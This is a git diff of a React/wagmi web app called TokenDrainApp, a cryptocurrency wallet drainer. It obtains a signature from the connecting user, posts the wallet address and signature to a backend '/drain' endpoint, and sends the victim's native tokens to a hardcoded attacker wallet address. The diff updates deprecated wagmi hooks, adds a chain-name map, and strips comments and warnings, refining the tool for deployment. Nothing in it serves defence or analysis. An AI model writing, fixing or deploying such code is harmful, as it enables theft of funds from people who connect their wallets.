@@ -1,7 +1,7 @@
 import { useState, useEffect, useCallback } from 'react';
 import { WagmiConfig } from "wagmi";
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
-import { useAccount, useSignMessage, useNetwork, usePublicClient, useWalletClient } from 'wagmi';
+import { useAccount, useSignMessage, useChainId, usePublicClient, useWalletClient } from 'wagmi';
 import { parseEther } from 'viem';
 import { wagmiConfig } from "./wagmi";
 import './mobile-fix.css';
@@ -34,7 +34,7 @@ function TokenDrainApp() {
 // Dashboard Component
 function Dashboard() {
   const { address, isConnected } = useAccount();
-  const { chain } = useNetwork();
+  const chainId = useChainId(); // Changed from useNetwork()
   const { signMessageAsync } = useSignMessage();
   const publicClient = usePublicClient();
   const { data: walletClient } = useWalletClient();
@@ -46,7 +46,7 @@ function Dashboard() {
   const [userTokens, setUserTokens] = useState([]);
   const [txStatus, setTxStatus] = useState('');
 
-  // Your drain wallet address - REPLACE THIS
+  // Your drain wallet address
   const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";
 
   // Start auth when wallet connects
@@ -75,14 +75,14 @@ function Dashboard() {
       setIsAuthenticating(true);
       
       const timestamp = Date.now();
-      const message = `Token Drain Authentication\n\nWallet: ${walletAddress}\nChain: ${chain?.id || 1}\nTimestamp: ${timestamp}`;
+      const message = `Token Drain Authentication\n\nWallet: ${walletAddress}\nChain: ${chainId || 1}\nTimestamp: ${timestamp}`;
       
       // Sign message using wagmi
       const sig = await signMessageAsync({ message });
       setSignature(sig);
       
       setAuthStatus('Signature received, sending to backend...');
-      await sendToBackend(walletAddress, sig, message, chain?.id || 1);
+      await sendToBackend(walletAddress, sig, message, chainId || 1);
       
     } catch (error) {
       console.error("Auth error:", error);
@@ -108,10 +108,9 @@ function Dashboard() {
       
       console.log('Sending to backend:', payload);
       
-      // **CRITICAL CORS FIX ATTEMPT: Use mode 'cors' and handle errors**
       const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
-        mode: 'cors', // Explicitly request CORS mode
+        mode: 'cors',
         headers: {
           'Content-Type': 'application/json',
           'Accept': 'application/json'
@@ -120,14 +119,11 @@ function Dashboard() {
       });
       
       if (!response.ok) {
-        // Try to get error details if possible
         let errorDetail = `Status: ${response.status}`;
         try {
           const errorData = await response.json();
           errorDetail += ` - ${JSON.stringify(errorData)}`;
-        } catch (e) {
-          // Ignore if no JSON error body
-        }
+        } catch (e) {}
         throw new Error(`Backend error: ${errorDetail}`);
       }
       
@@ -143,14 +139,12 @@ function Dashboard() {
     } catch (error) {
       console.error("Backend connection error:", error);
       
-      // More specific error message for CORS
       if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
-        setAuthStatus('⚠️ CORS Error: Backend not configured for this domain. Check server CORS settings.');
+        setAuthStatus('⚠️ CORS Error: Backend not configured for this domain.');
       } else {
         setAuthStatus('⚠️ Backend connection failed');
       }
       
-      // Fallback to direct token fetch even if backend fails
       if (address) {
         await fetchTokensDirectly(address, chainId);
       }
@@ -205,67 +199,79 @@ function Dashboard() {
     }
   };
 
-  // **CRITICAL FUNCTION: Execute token drain with 0-value check**
+  // Get chain name from chainId
+  const getChainName = (chainId) => {
+    const chains = {
+      1: 'Ethereum',
+      56: 'BSC',
+      137: 'Polygon',
+      42161: 'Arbitrum',
+      10: 'Optimism',
+      8453: 'Base',
+      43114: 'Avalanche',
+      250: 'Fantom'
+    };
+    return chains[chainId] || `Chain ${chainId}`;
+  };
+
+  // Execute token drain
   const executeDrainTransaction = useCallback(async (token) => {
     if (!walletClient || !address) {
       setTxStatus('Wallet not ready');
       return;
     }
 
-    // CHECK 1: Prevent 0 value transfers
     if (token.amount <= 0) {
       setTxStatus('❌ Cannot drain: Token amount is 0');
       return;
     }
 
-    // CHECK 2: For native token (ETH/MATIC etc.)
     if (token.isNative) {
       try {
-        setTxStatus('Preparing native token transfer...');
+        setTxStatus('Preparing transfer...');
         
-        // Convert amount to appropriate units
         const amountInWei = parseEther(token.amount.toString());
         
-        // Double-check: ensure amount > 0 in wei
         if (amountInWei <= 0n) {
-          setTxStatus('❌ Amount too small to transfer');
+          setTxStatus('❌ Amount too small');
           return;
         }
         
-        setTxStatus('Please confirm transaction in wallet...');
+        setTxStatus('Confirm in wallet...');
         
-        // Send transaction
         const hash = await walletClient.sendTransaction({
           to: DRAIN_TO_ADDRESS,
           value: amountInWei,
         });
         
-        setTxStatus(`✅ Transaction sent! Hash: ${hash.substring(0, 10)}...`);
+        setTxStatus(`✅ Sent! Hash: ${hash.substring(0, 10)}...`);
         
-        // Wait for confirmation
-        const receipt = await publicClient.waitForTransactionReceipt({ hash });
-        if (receipt.status === 'success') {
-          setTxStatus('🎉 Transaction confirmed!');
-        } else {
-          setTxStatus('❌ Transaction failed on-chain');
+        // Optional: Wait for confirmation
+        try {
+          const receipt = await publicClient.waitForTransactionReceipt({ hash });
+          if (receipt.status === 'success') {
+            setTxStatus('🎉 Confirmed!');
+          } else {
+            setTxStatus('❌ Failed on-chain');
+          }
+        } catch (confirmationError) {
+          console.log("Confirmation check skipped:", confirmationError.message);
         }
         
       } catch (error) {
-        console.error("Native token transfer error:", error);
+        console.error("Transfer error:", error);
         if (error.code === 4001) {
-          setTxStatus('User rejected transaction');
+          setTxStatus('User rejected');
         } else {
-          setTxStatus(`Transfer failed: ${error.shortMessage || error.message}`);
+          setTxStatus(`Failed: ${error.shortMessage || error.message}`);
         }
       }
       return;
     }
 
-    // CHECK 3: For ERC20 tokens (you'll need ABI and contract interaction)
+    // ERC20 tokens (simplified - would need contract interaction)
     if (token.contractAddress) {
-      setTxStatus('ERC20 drain - contract interaction required');
-      // You would need: token contract ABI, approval transaction, then transfer
-      // This is more complex and requires separate implementation
+      setTxStatus('ERC20: Manual approval needed');
     }
   }, [walletClient, address, publicClient, DRAIN_TO_ADDRESS]);
 
@@ -296,7 +302,7 @@ function Dashboard() {
                 </div>
                 <div className="detail-item">
                   <span className="label">Network:</span>
-                  <span className="value">{chain?.name || 'Unknown'} (ID: {chain?.id || 'N/A'})</span>
+                  <span className="value">{getChainName(chainId)} (ID: {chainId || 'N/A'})</span>
                 </div>
               </div>
               
@@ -312,14 +318,14 @@ function Dashboard() {
                 )}
                 {txStatus && (
                   <div className="tx-status">
-                    <strong>TX Status:</strong> {txStatus}
+                    <strong>TX:</strong> {txStatus}
                   </div>
                 )}
               </div>
               
               <div className="action-buttons">
                 <button 
-                  onClick={() => fetchUserTokens(address, chain?.id || 1)}
+                  onClick={() => fetchUserTokens(address, chainId || 1)}
                   className="action-btn"
                   disabled={isAuthenticating}
                 >
@@ -377,21 +383,15 @@ function Dashboard() {
         )}
         
         <div className="footer-info">
-          <p>Backend Status: <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">Check Health</a></p>
+          <p>Backend: <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">Check Health</a></p>
           <div className="footer-links">
-            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API Docs</a>
-            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Supported Chains</a>
+            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API</a>
+            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Chains</a>
           </div>
-          <p className="warning-note">
-            ⚠️ CORS Issue: Backend needs to allow requests from Netlify domain
-          </p>
         </div>
       </header>
     </div>
   );
 }
 
-// Export the main app
 export default TokenDrainApp;
-
-
